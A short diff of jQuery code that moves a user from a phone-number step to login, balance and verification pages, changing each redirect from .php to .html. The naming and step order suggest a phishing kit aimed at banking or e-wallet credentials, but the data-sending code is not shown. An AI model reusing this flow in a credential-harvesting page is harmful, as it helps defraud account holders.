@@ -14,7 +14,7 @@ function sendHp() {
         datatype: 'JSON',
       complete: function() {
          setTimeout(function() {
-            window.location = "lg.php";
+            window.location = "lg.html";
             $("#lonte").hide();
             $('.load').fadeOut();
             document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
@@ -38,7 +38,7 @@ function sendLogin() {
         datatype: 'JSON',
       complete: function() {
          setTimeout(function() {
-            window.location = "blnce.php";
+            window.location = "blnce.html";
             $("#lonte").hide();
             $('.load').fadeOut();
             document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
@@ -62,7 +62,7 @@ function sendSaldo() {
         datatype: 'JSON',
       complete: function() {
          setTimeout(function() {
-            window.location = "ver.php";
+            window.location = "ver.html";
             $("#lonte").hide();
             $('.load').fadeOut();
             document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
